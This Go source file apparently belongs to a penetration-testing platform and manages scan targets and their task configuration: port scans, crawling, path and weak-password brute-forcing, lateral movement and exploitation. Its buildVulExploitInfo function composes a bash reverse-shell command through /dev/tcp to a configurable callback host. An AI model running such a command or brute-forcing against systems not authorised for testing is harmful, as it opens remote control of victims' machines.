package services

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"smart/models/mysqls"
	"smart/tools/enums"
	"smart/tools/network"
	"smart/tools/utils"
	"strconv"
	"strings"
	"time"

	log "github.com/sirupsen/logrus"
	"gitlabee.4dogs.cn/common/mysql"
)

// 渗透测试目标管理服务
type TaskTarget struct {
}

// AddTargetIfNotExist 如果目标不存在则添加
func (t *TaskTarget) AddTargetIfNotExist(ctx context.Context, taskID int, targetURL string) (int, error) {
	var targetModel mysqls.TaskTarget

	// Check if exists
	existing, err := targetModel.GetTaskTargetByUrl(ctx, taskID, targetURL)
	if err == nil && existing.ID > 0 {
		return existing.ID, nil // Already exists
	}

	// Create new target
	newTarget := mysqls.TaskTarget{
		TaskID:     taskID,
		TargetURL:  targetURL,
		Status:     enums.TargetStatusToTrigger, // Default to waiting state
		CreateTime: time.Now(),
		UpdateTime: time.Now(),
		EndTime:    time.Unix(0, 0),    // Default to 1970
		IsAlive:    enums.TargetIsAliveY, // Default to alive for discovered targets
		// Inherit some defaults or leave empty
	}

	// Try to get task template from a sibling target?
	// For now, leave template empty or simple default.
	// Ideally we should copy config from parent target, but we don't have parent ID passed here easily.

	err = newTarget.AddTaskTarget(ctx)
	if err != nil {
		return 0, err
	}
	return newTarget.ID, nil
}

// AddTargetIfNotExistWithParent 如果目标不存在则添加，并设置父级ID
func (t *TaskTarget) AddTargetIfNotExistWithParent(ctx context.Context, taskID int, targetURL string, parentID int) (int, error) {
	var targetModel mysqls.TaskTarget

	// Check if exists
	existing, err := targetModel.GetTaskTargetByUrl(ctx, taskID, targetURL)
	if err == nil && existing.ID > 0 {
		return existing.ID, nil // Already exists
	}

	// 记录父级ID
	extendField := map[string]int{
		"hengxiang_pid": parentID,
	}
	extendFieldStr, _ := json.Marshal(extendField)

	// Create new target
	newTarget := mysqls.TaskTarget{
		TaskID:      taskID,
		TargetURL:   targetURL,
		Status:      enums.TargetStatusToTrigger, // Default to waiting state
		CreateTime:  time.Now(),
		UpdateTime:  time.Now(),
		EndTime:     time.Unix(0, 0),      // Default to 1970
		IsAlive:     enums.TargetIsAliveY, // Default to alive for discovered targets
		ExtendField: string(extendFieldStr),
	}

	err = newTarget.AddTaskTarget(ctx)
	if err != nil {
		return 0, err
	}
	return newTarget.ID, nil
}

// GetOneWaitTarget 开始一个检测目标
func (t *TaskTarget) GetOneWaitTarget(ctx context.Context, taskIDs []int64) mysqls.TaskTarget {
	var target mysqls.TaskTarget
	another := target.GetOneWaitTarget(ctx, enums.TargetStatusToBegin, taskIDs)
	return another
}

// GetTargetsByTaskIdsStatus 根据任务id获取多个目标数据
func (t *TaskTarget) GetTargetsByTaskIdsStatus(ctx context.Context, taskIds []int, status int, limit int) []mysqls.TaskTarget {
	var target mysqls.TaskTarget
	return target.GetTargetsByTaskIdsStatus(ctx, taskIds, status, limit)
}

// StartOneTarget 开始一个检测目标
func (t *TaskTarget) StartOneTarget(ctx context.Context, target mysqls.TaskTarget) error {
	target.Status = enums.TargetStatusRunning
	target.CreateTime = time.Now()
	target.UpdateTime = time.Now()
	isAlive, err := utils.PingIpIsLive(target.TargetURL)
	if isAlive {
		target.IsAlive = enums.TargetIsAliveY
	}
	err = target.UpdateTaskTarget(ctx)
	if err != nil {
		return errors.New("StartOneTarget error: " + err.Error())
	}
	return nil
}

// PingIpIsLive 检测目标是否存活
func (t *TaskTarget) PingIpIsLive(targetUrl string) (int, error) {
	var result = enums.TargetIsAliveN
	isAlive, err := utils.PingIpIsLive(targetUrl)
	if err != nil {
		return result, err
	}
	if isAlive {
		result = enums.TargetIsAliveY
	}
	return result, nil
}

// UpdateStatus 更新目标状态
func (t *TaskTarget) UpdateStatus(ctx context.Context, targetID int, status int) error {
	var target mysqls.TaskTarget
	target.ID = targetID
	target.Status = status
	target.UpdateTime = time.Now()

	// We use UpdateTaskTarget which updates non-zero fields.
	// However, we only want to update specific fields.
	// Let's use UpdateTargetById which accepts a map.
	params := map[string]interface{}{
		"status":      status,
		"update_time": time.Now(),
	}
	return target.UpdateTargetById(mysql.NewContext(ctx, mysql.GetDB()), targetID, params)
}

// UpdateTargetAndSaveTargetLog 修改目标表,并添加目标日志
func (t *TaskTarget) UpdateTargetAndSaveTargetLog(ctx context.Context, taskID, targetID, status, isAlive int, targetURL string) (int, error) {
	tx := mysql.DB.Begin()
	dCtx := mysql.NewContext(ctx, tx)
	defer tx.Rollback()

	var target mysqls.TaskTarget
	var params = map[string]interface{}{
		"status":      status,
		"is_alive":    isAlive,
		"create_time": time.Now(),
		"update_time": time.Now(),
	}
	err := target.UpdateTargetById(dCtx, targetID, params)
	if err != nil {
		return 0, err
	}
	var taskLog = mysqls.Tasklog{
		TaskID:     taskID,
		TargetID:   targetID,
		TargetURL:  targetURL,
		Status:     status,
		IsAlive:    isAlive,
		CreateTime: time.Now(),
		StartTime:  time.Now(),
		EndTime:    time.Now(),
	}
	err = taskLog.AddTasklog(dCtx)
	if err != nil {
		return 0, err
	}
	if err := tx.Commit().Error; err != nil {
		return 0, err
	}
	return taskLog.ID, nil
}

// GetRunningNumber 获取正在运行的检测目标数
func (t *TaskTarget) GetRunningNumber(ctx context.Context) int {
	var target mysqls.TaskTarget
	number := target.GetTargetNumberByStatus(ctx, enums.TargetStatusRunning)
	numberStr := strconv.FormatInt(number, 10)
	numberInt, _ := strconv.Atoi(numberStr)
	return numberInt
}

// GetTargetNumByStatus 根据状态获取目标数量
func (t *TaskTarget) GetTargetNumByStatus(ctx context.Context, status int) (int64, error) {
	var target mysqls.TaskTarget
	return target.GetTargetNumByStatus(ctx, status)
}

// GetRunningNumberByTaskID 通过任务id获取正在运行的检测目标数
func (t *TaskTarget) GetRunningNumberByTaskID(ctx context.Context, taskID int) int {
	var target mysqls.TaskTarget
	statusList := []int{enums.TargetStatusToTrigger, enums.TargetStatusRunning, enums.TargetStatusPausing}
	number := target.GetTargetNumberByStatusAndTaskID(ctx, statusList, taskID)
	numberStr := strconv.FormatInt(number, 10)
	numberInt, _ := strconv.Atoi(numberStr)
	return numberInt
}

// SendOneTarget 发送一个检测目标
func (t *TaskTarget) SendOneTarget(ctx context.Context, newTarget mysqls.TaskTarget) error {
	var configJson enums.ConfigJson
	err := json.Unmarshal([]byte(newTarget.TaskTemplateJSON), &configJson)
	if err != nil {
		return errors.New("SendOneTarget error: " + err.Error())
	}
	if configJson.PortScanConfig.ScanPort == "" {
		return errors.New("SendOneTarget scan port cannot be null")
	}
	vulIDList := configJson.VulIdsConfig

	callTools := t.buildCallTools(configJson)
	infoList := make([]Info, 0)
	if configJson.PortScanConfig.ScanPort == "" {
		log.Errorf("to scan port cannot be null")
	}
	infoList = append(infoList, Info{Name: "toScanPort", Value: configJson.PortScanConfig.ScanPort})
	t.buildCrawlerInfo(configJson, &infoList)
	t.buildWebPathScanInfo(configJson, &infoList)
	t.buildPassBruteInfo(configJson, &infoList)
	t.buildVulExploitInfo(ctx, configJson, &infoList)
	taskControlMessage := TaskControlMessage{
		ObjId:     strconv.Itoa(newTarget.ID),
		CallTools: callTools,
		CallVuls:  vulIDList,
		TargetUrl: newTarget.TargetURL,
		Operate:   enums.TaskOperateCreate,
		InfoList:  infoList,
	}
	return t.callDecision(taskControlMessage)
}

// CreateDecisionMsg 构建任务发送消息
func (t *TaskTarget) CreateDecisionMsg(ctx context.Context, newTarget mysqls.TaskTarget, logId int) (TaskControlMessage, error) {
	var msgStruct = TaskControlMessage{
		ObjId:         strconv.Itoa(newTarget.ID),
		TaskId:        newTarget.TaskID,
		Operate:       enums.TaskOperateCreate,
		CallTools:     make([]string, 0),
		TargetUrl:     newTarget.TargetURL,
		CallVuls:      make([]int, 0),
		InfoList:      make([]Info, 0),
		Info:          "",
		TestIntensity: enums.TaskTaskEnum.TestIntensityToExploitImpact(enums.TaskTestIntensityOne),
		SafeTest:      false,
		LateralMove:   TaskControlMessageLateralMove{},
		Mode:          enums.Mode{},
		Proxy:         "",
	}
	//解析配置
	var configJson enums.ConfigJson
	err := json.Unmarshal([]byte(newTarget.TaskTemplateJSON), &configJson)
	if err != nil {
		return msgStruct, err
	}
	if configJson.PortScanConfig.ScanPort == "" {
		return msgStruct, errors.New("SendOneTarget scan port cannot be null")
	}
	// 任务运行模式
	msgStruct.Mode = configJson.Mode
	// 任务代理
	if configJson.ProxyConfig.IsOpen {
		// 协议
		proto := configJson.ProxyConfig.GetProxyConfigProtoEnum(configJson.ProxyConfig.Proto) + "://"
		// 如果有账号密码
		auth := ""
		if configJson.ProxyConfig.IsAuth && configJson.ProxyConfig.Username != "" && configJson.ProxyConfig.Password != "" {
			auth = configJson.ProxyConfig.Username + ":" + configJson.ProxyConfig.Password + "@"
		}
		// 拼IP与端口
		ipPort := configJson.ProxyConfig.Addr + ":" + configJson.ProxyConfig.Port
		msgStruct.Proxy = proto + auth + ipPort
	}

	//SafeTest
	msgStruct.SafeTest = configJson.SafeTest
	//LateralMove
	if configJson.LateralMove.IsOpen {
		msgStruct.LateralMove.IsOpen = configJson.LateralMove.IsOpen
		msgStruct.LateralMove.Range = configJson.LateralMove.Range
	}
	//VulExploit
	msgStruct.VulExploit = configJson.VulExploit
	//TestIntensity
	msgStruct.TestIntensity = enums.TaskTaskEnum.TestIntensityToExploitImpact(configJson.TestIntensity)
	//CallVuls
	msgStruct.CallVuls = configJson.VulIdsConfig
	//CallTools
	msgStruct.CallTools = t.buildCallTools(configJson)

	//InfoList
	infoList := make([]Info, 0)
	t.buildScanPortInfo(configJson, &infoList, msgStruct.TargetUrl)          //端口扫描
	t.buildCrawlerInfo(configJson, &infoList)                                //爬虫
	t.buildPassBruteInfo(configJson, &infoList)                              //弱口令爆破
	t.buildWebPathScanInfo(configJson, &infoList)                            //路径爆破
	t.buildWebSiteLoginInfo(ctx, configJson, &infoList, msgStruct.TargetUrl) //登录扫描
	t.buildOtherInfo(ctx, configJson, &infoList, msgStruct.TargetUrl)        //其他信息
	err = t.buildVulExploitInfo(ctx, configJson, &infoList)                  //漏洞利用
	if err != nil {
		return msgStruct, err
	}

	msgStruct.InfoList = infoList
	//info
	var infomsg = TaskControlMessageInfo{
		TaskId:   newTarget.TaskID,
		TargetId: newTarget.ID,
		LogId:    logId,
	}
	infostring, err := json.Marshal(infomsg)
	if err != nil {
		return msgStruct, err
	}
	msgStruct.Info = string(infostring)
	return msgStruct, nil
}

// CreatePortMsg 返回添加端口攻击面的信令
func (t *TaskTarget) CreateAddInfoMsg(newTarget mysqls.TaskTarget, port, logId int) (TaskControlMessage, error) {
	var msgStruct = TaskControlMessage{
		ObjId:         strconv.Itoa(newTarget.ID),
		Operate:       enums.TaskOperateAddInfo,
		CallTools:     make([]string, 0),
		TargetUrl:     newTarget.TargetURL,
		CallVuls:      make([]int, 0),
		InfoList:      make([]Info, 0),
		Info:          "",
		TestIntensity: "",
	}
	//InfoList
	infoList := make([]Info, 0)
	if port != 0 {
		infoList = append(infoList, Info{Name: "toScanPort", Value: strconv.Itoa(port)})
		infoList = append(infoList, Info{Name: "tcpScanType", Value: strconv.Itoa(enums.TaskConfigurationTcpScanTypeConnect)})
	}
	msgStruct.InfoList = infoList
	//info
	var infomsg = TaskControlMessageInfo{
		TaskId:   newTarget.TaskID,
		TargetId: newTarget.ID,
		LogId:    logId,
	}
	infostring, err := json.Marshal(infomsg)
	if err != nil {
		return msgStruct, err
	}
	msgStruct.Info = string(infostring)
	return msgStruct, nil
}

// CreateAddInfoMsgPath 返回添加敏感路径的信令
func (t *TaskTarget) CreateAddInfoMsgPath(newTarget mysqls.TaskTarget, infoType, url string, logId int) (TaskControlMessage, error) {
	var msgStruct = TaskControlMessage{
		ObjId:         strconv.Itoa(newTarget.ID),
		Operate:       enums.TaskOperateAddInfo,
		CallTools:     make([]string, 0),
		TargetUrl:     newTarget.TargetURL,
		CallVuls:      make([]int, 0),
		InfoList:      make([]Info, 0),
		Info:          "",
		TestIntensity: "",
	}
	//InfoList
	infoList := make([]Info, 0)
	if infoType == "login" {
		infoList = append(infoList, Info{Name: "login_url", Value: url})
	} else if infoType == "upload" {
		infoList = append(infoList, Info{Name: "upload_url", Value: url})
	}
	msgStruct.InfoList = infoList
	//info
	var infomsg = TaskControlMessageInfo{
		TaskId:   newTarget.TaskID,
		TargetId: newTarget.ID,
		LogId:    logId,
	}
	infostring, err := json.Marshal(infomsg)
	if err != nil {
		return msgStruct, err
	}
	msgStruct.Info = string(infostring)
	return msgStruct, nil
}

// CreateAddInfoMsgLoginCred 返回添加登录凭证的信令
func (t *TaskTarget) CreateAddInfoMsgLoginCred(newTarget mysqls.TaskTarget, ip, port, infoType, value string, logId int) (TaskControlMessage, error) {
	var msgStruct = TaskControlMessage{
		ObjId:         strconv.Itoa(newTarget.ID),
		Operate:       enums.TaskOperateAddInfo,
		CallTools:     make([]string, 0),
		TargetUrl:     newTarget.TargetURL,
		CallVuls:      make([]int, 0),
		InfoList:      make([]Info, 0),
		Info:          "",
		TestIntensity: "",
	}
	//InfoList
	infoList := make([]Info, 0)
	if infoType == "cookie" {
		infoList = append(infoList, Info{Name: "cookie", Value: value})
	} else if infoType == "header" {
		infoList = append(infoList, Info{Name: "header", Value: value})
	}
	msgStruct.InfoList = infoList
	//info
	var infomsg = TaskControlMessageInfo{
		TaskId:   newTarget.TaskID,
		TargetId: newTarget.ID,
		LogId:    logId,
	}
	infostring, err := json.Marshal(infomsg)
	if err != nil {
		return msgStruct, err
	}
	msgStruct.Info = string(infostring)
	return msgStruct, nil
}

// 停止任务
func (t *TaskTarget) StopTarget(targetId int) error {
	taskControlMessage := TaskControlMessage{
		ObjId:   strconv.Itoa(targetId),
		Operate: enums.TaskOperateStop,
	}
	return t.callDecision(taskControlMessage)
}

// 暂停任务
func (t *TaskTarget) PurseTarget(targetId int) error {
	taskControlMessage := TaskControlMessage{
		ObjId:   strconv.Itoa(targetId),
		Operate: enums.TaskOperatePause,
	}
	return t.callDecision(taskControlMessage)
}

// 恢复任务
func (t *TaskTarget) ResumeTarget(targetId int) error {
	taskControlMessage := TaskControlMessage{
		ObjId:   strconv.Itoa(targetId),
		Operate: enums.TaskOperateResume,
	}
	return t.callDecision(taskControlMessage)
}

// 与decision通信
func (t *TaskTarget) callDecision(data TaskControlMessage) error {
	if data.ObjId == "" {
		return errors.New("与decision通信 objId不可为空")
	}
	// if data.Operate == "" {
	// 	return errors.New("与decision通信 操作类型不可为空")
	// }

	// switch data.Operate {
	// case enums.TaskOperateCreate:
	// 	if len(data.CallTools) == 0 {
	// 		return errors.New("与decision通信 调用工具不可为空")
	// 	}
	// 	if len(data.CallVuls) == 0 {
	// 		return errors.New("与decision通信 调用漏洞不可为空")
	// 	}
	// 	if data.TargetUrl == "" {
	// 		return errors.New("与decision通信 目标地址不可为空")
	// 	}
	// 	if len(data.InfoList) == 0 {
	// 		return errors.New("与decision通信 信息不可为空")
	// 	}
	// case enums.TaskOperatePause:
	// case enums.TaskOperateStop:
	// case enums.TaskOperateResume:
	// case enums.TaskOperateAddInfo:
	// default:
	// 	return errors.New("与decision通信 未知的操作类型")
	// }

	// messageByte, err := json.Marshal(data)
	// if err != nil {
	// 	return errors.New("SendOneTarget error: " + err.Error())
	// }
	// messageBody := string(messageByte)
	return nil
}

// SendDecisionMsg 向决策引擎发送消息
func (t *TaskTarget) SendDecisionMsg(data TaskControlMessage) error {
	// 已移除 RabbitMQ 发送，保持兼容返回
	return nil
}

// 获取任务场景
func (t *TaskTarget) getTaskTemplateTool(ctx context.Context, newTask mysqls.TaskTask) []int {
	vulIDList := make([]int, 0)
	var sceneTaskTemplate SceneTaskTemplate
	vulIDList = sceneTaskTemplate.GetTemplateVulIds(ctx, newTask.TaskTemplateID)
	return vulIDList
}

// 构建调用工具
func (t *TaskTarget) buildCallTools(configJson enums.ConfigJson) []string {
	callTools := []string{enums.ScriptNamePortScan, enums.ScriptNameSecondDirBrute, enums.ScriptNameFingerPrint}
	if configJson.WebCrawlerConfig.IsOpen {
		callTools = append(callTools, enums.ScriptNameCrawlerx)
	}
	if configJson.WebPathScanConfig.IsOpen {
		callTools = append(callTools, enums.ScriptNameWebDirPathScan)
	}
	if configJson.SubdomainCollectConfig.IsOpen {
		callTools = append(callTools, enums.ScriptNameSubdomain)
	}
	return callTools
}

// buildScanPortInfo 构建端口扫描信息
func (t *TaskTarget) buildVulExploitInfo(ctx context.Context, configJson enums.ConfigJson, infoList *[]Info) error {
	if configJson.VulExploit {
		var reverseHost = "192.168.0.68"
		var reversePort = "6666"
		var mapset mysqls.MapSet
		mapSetRes, err := mapset.GetsByObjKey(ctx, enums.ReverseIpHostMapSetObjKey)
		if err != nil {
			return err
		}
		var objValue ReverseIpHost
		err = json.Unmarshal([]byte(mapSetRes.ObjValue), &objValue)
		if err != nil {
			return err
		}
		if objValue.ReversePort != 0 {
			reversePort = strconv.Itoa(objValue.ReversePort)
		}
		if objValue.ReverseType == enums.TypeCustom && len(objValue.ReverseHost) != 0 { //自定义
			reverseHost = objValue.ReverseHost
		} else if objValue.ReverseType == enums.TypeSystem { //系统
			reverseHost, err = GetReverseIp()
		}
		*infoList = append(*infoList, Info{
			Name:  "command",
			Value: fmt.Sprintf(`/bin/bash -c "/bin/bash </dev/tcp/%s/%s 2>&0 1>&0 &"`, reverseHost, reversePort),
		})
		*infoList = append(*infoList, Info{
			Name:  "reverseHost",
			Value: reverseHost,
		})
		*infoList = append(*infoList, Info{
			Name:  "reversePort",
			Value: reversePort,
		})
	}
	return nil
}

func GetReverseIp() (string, error) {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "", err
	}
	var ip string
	for _, address := range addrs {
		// 检查ip地址判断是否回环地址
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
				if strings.HasPrefix(ip, "172.17") || strings.HasPrefix(ip, "172.18") || strings.HasPrefix(ip, "172.19") || strings.HasPrefix(ip, "169.254") {
					continue
				}
				break
			}
		}
	}
	return ip, nil

}

// buildScanPortInfo 构建端口扫描信息
func (t *TaskTarget) buildScanPortInfo(configJson enums.ConfigJson, infoList *[]Info, targetUrl string) {
	_, _, port, _ := network.ParseUrl(targetUrl)
	if strings.HasPrefix(targetUrl, "http") {
		*infoList = append(*infoList, Info{Name: "toScanPort", Value: port})
	} else {
		*infoList = append(*infoList, Info{Name: "toScanPort", Value: configJson.PortScanConfig.ScanPort})
	}

	*infoList = append(*infoList, Info{ //todo 脚本参数未定
		Name:  "tcpScanType",
		Value: strconv.Itoa(configJson.PortScanConfig.TCPScanType),
	})
}

// buildCrawlerInfo 构建爬虫信息
func (t *TaskTarget) buildCrawlerInfo(configJson enums.ConfigJson, infoList *[]Info) {
	// 爬虫配置 注意这里使用的新版爬虫，具体爬虫脚本需要与此参数对接，可进入爬虫配置中查看具体说明
	if !configJson.WebCrawlerConfig.IsOpen {
		return
	}
	*infoList = append(*infoList, Info{
		Name:  "crawlerMaxDepth",
		Value: strconv.Itoa(configJson.WebCrawlerConfig.MaxDepth),
	})
	*infoList = append(*infoList, Info{
		Name:  "crawlerMaxUrl",
		Value: strconv.Itoa(configJson.WebCrawlerConfig.MaxUrl),
	})
	*infoList = append(*infoList, Info{
		Name:  "crawlerScanRange",
		Value: strconv.Itoa(configJson.WebCrawlerConfig.ScanRange),
	})
	*infoList = append(*infoList, Info{
		Name:  "crawlerTimeout",
		Value: strconv.Itoa(configJson.WebCrawlerConfig.Timeout),
	})
	*infoList = append(*infoList, Info{
		Name:  "crawlerFullTimeout",
		Value: strconv.Itoa(configJson.WebCrawlerConfig.FullTimeout),
	})
	*infoList = append(*infoList, Info{
		Name:  "crawlerScanRepeat",
		Value: strconv.Itoa(configJson.WebCrawlerConfig.ScanRepeat),
	})
	*infoList = append(*infoList, Info{
		Name:  "crawlerBlackList",
		Value: configJson.WebCrawlerConfig.BlackList,
	})
	*infoList = append(*infoList, Info{
		Name:  "crawlerWhiteList",
		Value: configJson.WebCrawlerConfig.WhiteList,
	})
	headersByte, err := json.Marshal(configJson.WebCrawlerConfig.Headers)
	if err == nil {
		*infoList = append(*infoList, Info{
			Name:  "crawlerHeaders",
			Value: string(headersByte),
		})
	}
	*infoList = append(*infoList, Info{
		Name:  "crawlerInvalidSuffix",
		Value: configJson.WebCrawlerConfig.SuffixFilter,
	})
	if configJson.WebCrawlerConfig.LocalStorage.IsOpen {
		localStorageByte, err := json.Marshal(configJson.WebCrawlerConfig.LocalStorage.List)
		if err == nil {
			*infoList = append(*infoList, Info{
				Name:  "crawlerLocalStorage",
				Value: string(localStorageByte),
			})
		}
	}
}

// buildWebPathScanInfo 构建路径爆破信息
func (t *TaskTarget) buildWebPathScanInfo(configJson enums.ConfigJson, infoList *[]Info) {
	if !configJson.WebPathScanConfig.IsOpen {
		return
	}
	*infoList = append(*infoList, Info{
		Name:  "PathScanGuessRate",
		Value: strconv.Itoa(configJson.WebPathScanConfig.GuessRate),
	})
	*infoList = append(*infoList, Info{
		Name:  "PathScanGuessTimeout",
		Value: strconv.Itoa(configJson.WebPathScanConfig.GuessTimeout),
	})
	var scanDict string
	for _, num := range configJson.WebPathScanConfig.ScanDict {
		scanDict += strconv.Itoa(num) + ","
	}
	*infoList = append(*infoList, Info{
		Name:  "PathScanScanDict",
		Value: strings.Trim(scanDict, ","),
	})
	*infoList = append(*infoList, Info{
		Name:  "PathScanTitleBlack",
		Value: configJson.WebPathScanConfig.TitleBlack,
	})
	*infoList = append(*infoList, Info{
		Name:  "isIntelligent",
		Value: fmt.Sprintf("%t", configJson.WebPathScanConfig.IsIntelligent),
	})
}

// buildPassBruteInfo 构建弱口令爆破配置信息
func (t *TaskTarget) buildPassBruteInfo(configJson enums.ConfigJson, infoList *[]Info) {
	if !configJson.WeakPassConfig.IsOpen {
		return
	}
	*infoList = append(*infoList, Info{
		Name:  "dictType",
		Value: strconv.Itoa(configJson.WeakPassConfig.DictType),
	})
	*infoList = append(*infoList, Info{
		Name:  "guessNum",
		Value: strconv.Itoa(configJson.WeakPassConfig.GuessNum),
	})
	*infoList = append(*infoList, Info{
		Name:  "guessTimeout",
		Value: strconv.Itoa(configJson.WeakPassConfig.GuessTimeout),
	})
	*infoList = append(*infoList, Info{
		Name:  "guessRate",
		Value: strconv.Itoa(configJson.WeakPassConfig.GuessRate),
	})
	*infoList = append(*infoList, Info{
		Name:  "captchaMode",
		Value: configJson.WeakPassConfig.CaptchaMode,
	})

	if configJson.WeakPassConfig.DictType == enums.TaskConfigurationWeakPassDictTypeCommon {
		*infoList = append(*infoList, Info{
			Name:  "commonUserDict",
			Value: strconv.Itoa(configJson.WeakPassConfig.CommonUserDict),
		})
		*infoList = append(*infoList, Info{
			Name:  "commonPassDict",
			Value: strconv.Itoa(configJson.WeakPassConfig.CommonPassDict),
		})
	} else if configJson.WeakPassConfig.DictType == enums.TaskConfigurationWeakPassDictTypeAdd {
		*infoList = append(*infoList, Info{
			Name:  "addAccount",
			Value: configJson.WeakPassConfig.AddAccount,
		})
		*infoList = append(*infoList, Info{
			Name:  "addPass",
			Value: configJson.WeakPassConfig.AddPass,
		})
		if configJson.WeakPassConfig.OnlyUseAdd {
			*infoList = append(*infoList, Info{
				Name:  "onlyUseAdd",
				Value: "1",
			})
		} else {
			*infoList = append(*infoList, Info{
				Name:  "onlyUseAdd",
				Value: "0",
			})
		}
	} else {
		//如果是默认字典不用做操作
	}
	var serviceString string
	for _, service := range configJson.WeakPassConfig.Services {
		serviceString = serviceString + "," + strconv.Itoa(service)
	}
	*infoList = append(*infoList, Info{
		Name:  "serviceList",
		Value: strings.Trim(serviceString, ","),
	})
}

// buildPassBruteInfo 构建弱口令爆破配置信息
func (t *TaskTarget) buildWebSiteLoginInfo(ctx context.Context, configJson enums.ConfigJson, infoList *[]Info, targetUrl string) {
	if !configJson.WebsiteLoginConfig.IsOpen {
		return
	}
	for _, loginConfig := range configJson.WebsiteLoginConfig.List {
		if loginConfig.Target == "" {
			continue
		}
		scheme1, host1, port1, _ := network.ParseUrl(targetUrl)
		scheme2, host2, port2, _ := network.ParseUrl(loginConfig.Target)
		if scheme1 != scheme2 || host1 != host2 || port1 != port2 {
			continue
		}
		if loginConfig.VerifyType == enums.TaskConfigurationWebsiteLoginCookie {
			*infoList = append(*infoList, Info{
				Name:  "cookie",
				Value: loginConfig.VerifyValue,
			})
		} else if loginConfig.VerifyType == enums.TaskConfigurationWebsiteLoginHeader {
			*infoList = append(*infoList, Info{
				Name:  "crawlerHeaders",
				Value: loginConfig.VerifyValue,
			})
		}
	}
}

// buildPassBruteInfo 构建其他信息
func (t *TaskTarget) buildOtherInfo(ctx context.Context, configJson enums.ConfigJson, infoList *[]Info, targetUrl string) {
	url := network.ParseUrl2(targetUrl)
	if url.Path != "" && url.Path != "/" {
		*infoList = append(*infoList, Info{
			Name:  "path",
			Value: url.Path,
		})
	}
}

// FinishTarget 完成一个正在运行的任务
func (t *TaskTarget) FinishTarget(ctx context.Context, objId int) {
	var target mysqls.TaskTarget
	err := target.UpdateTaskCheckTargetStatus(ctx, objId, enums.TargetStatusFinish)
	if err != nil {
		log.Error("FinishTarget finish error: ", err.Error())
	}
}

// GetTaskID 获取taskId
func (t *TaskTarget) GetTaskID(ctx context.Context, targetID int) int {
	var target mysqls.TaskTarget
	checkTarget, err := target.GetTaskTarget(ctx, targetID)
	if err != nil {
		log.Errorf("target finish error: %s", err)
	}
	return checkTarget.TaskID
}

// TargetList 目标列表及筛选
func (t *TaskTarget) TargetList(ctx context.Context, taskId, riskLevel int, search string, page, size int) ([]mysqls.TaskTarget, int64, error) {

	var target mysqls.TaskTarget
	return target.GetTargetListByTaskId(ctx, taskId, riskLevel, search, enums.TargetIsAliveY, page, size)
}

// UpdateTargetUseScore 修改目标可利用评分
func (t *TaskTarget) UpdateTargetUseScore(ctx context.Context, data map[int]int) error {
	var target mysqls.TaskTarget
	tx := mysql.DB.Begin()
	dCtx := mysql.NewContext(ctx, tx)
	defer tx.Rollback()
	for key, val := range data {
		var param = map[string]interface{}{
			"use_score": val,
			"is_score":  enums.TargetIsScoreFinish,
		}
		err := target.UpdateTargetById(dCtx, key, param)
		if err != nil {
			return err
		}
	}
	if err := tx.Commit().Error; err != nil {
		return err
	}
	return nil
}

// GetTargetOpenPort 获取任务的开发端口
func (t *TaskTarget) GetTargetOpenPort(ctx context.Context, targetIds any) (map[string][]string, error) {
	var (
		result       = make(map[string][]string, 0)
		targetResult mysqls.TaskTaskResult
	)
	taskResultlist, err := targetResult.GetTaskTaskResultByType(ctx, enums.TaskResultObjTypeInfo, enums.TaskResultSubObjTypeService, targetIds)
	if err != nil {
		return result, err
	}
	for i := 0; i < len(taskResultlist); i++ {
		result[taskResultlist[i].SubObjID] = append(result[taskResultlist[i].SubObjID], taskResultlist[i].Field2)
	}
	return result, nil
}

// DelTargetByIds 删除目标
func (t *TaskTarget) DelTargetByIds(ctx context.Context, targetIds any) error {
	var (
		target           mysqls.TaskTarget
		taskVul          mysqls.TaskVul
		taskTaskResult   mysqls.TaskTaskResult
		taskTargetResult mysqls.TaskTargetResult
		taskResult       mysqls.TaskResult
		taskLog          mysqls.Tasklog
		taskLogInfo      mysqls.Taskloginfo
	)
	tx := mysql.DB.Begin()
	dCtx := mysql.NewContext(ctx, tx)
	defer tx.Rollback()
	//删除目标表
	err := target.DeleteTaskTarget(dCtx, targetIds)
	if err != nil {
		return err
	}
	//删除任务漏洞表
	err = taskVul.DeleteTaskVulByTargetIds(dCtx, targetIds)
	if err != nil {
		return err
	}
	//删除任务结果通用表
	err = taskTaskResult.DeleteTaskTaskResultBySubobjids(dCtx, targetIds)
	if err != nil {
		return err
	}
	//删除目标结果通用表
	err = taskTargetResult.DeleteByObjIds(dCtx, targetIds)
	if err != nil {
		return err
	}
	//删除任务结果表
	err = taskResult.DeleteTaskResultByTargetIds(dCtx, targetIds)
	if err != nil {
		return err
	}
	//删除任务日志表
	err = taskLog.DeleteTasklogByTargetIds(dCtx, targetIds)
	if err != nil {
		return err
	}
	//删除任务日志详情表
	err = taskLogInfo.DeleteTaskloginfoByTargetIds(dCtx, targetIds)
	if err != nil {
		return err
	}
	if err := tx.Commit().Error; err != nil { //提交事务
		return err
	}
	return nil
}

// GetTargetById 根据目标id获取目标信息
func (t *TaskTarget) GetTargetById(ctx context.Context, id int) (mysqls.TaskTarget, error) {
	var targetResult mysqls.TaskTarget
	return targetResult.GetTaskTarget(ctx, id)
}

// GetTargetByIds 根据目标ids获取目标信息
func (t *TaskTarget) GetTargetByIds(ctx context.Context, ids []int, status int) (returnData map[int]mysqls.TaskTarget) {
	var targetResult mysqls.TaskTarget
	targets := targetResult.GetByIds(ctx, ids, status)

	returnData = make(map[int]mysqls.TaskTarget)
	for _, item := range targets {
		returnData[item.ID] = item
	}
	return
}

func (t *TaskTarget) GetTaskTargetListByIds(ctx context.Context, ids []int, status int) []mysqls.TaskTarget {
	var targetResult mysqls.TaskTarget
	return targetResult.GetTaskTargetListByIds(ctx, ids, status)
}

// GetTargetByTaskId 根据任务id获取目标信息
func (t *TaskTarget) GetTargetByTaskId(ctx context.Context, taskId int) ([]mysqls.TaskTarget, int) {
	var targetResult mysqls.TaskTarget
	list, count := targetResult.GetByTaskId(ctx, taskId)

	return list, int(count)
}

// UpdateTargetStateById 修改目标状态
func (t *TaskTarget) UpdateTargetStateById(ctx context.Context, id int, state int) error {
	var targetResult mysqls.TaskTarget
	return targetResult.UpdateTargetStatusById(ctx, id, state)
}

// UpdateTargetStateByIds 修改目标状态
func (t *TaskTarget) UpdateTargetStateByIds(ctx context.Context, ids any, state int) error {
	var targetResult mysqls.TaskTarget
	return targetResult.UpdateTargetStatusByIds(ctx, ids, state)
}

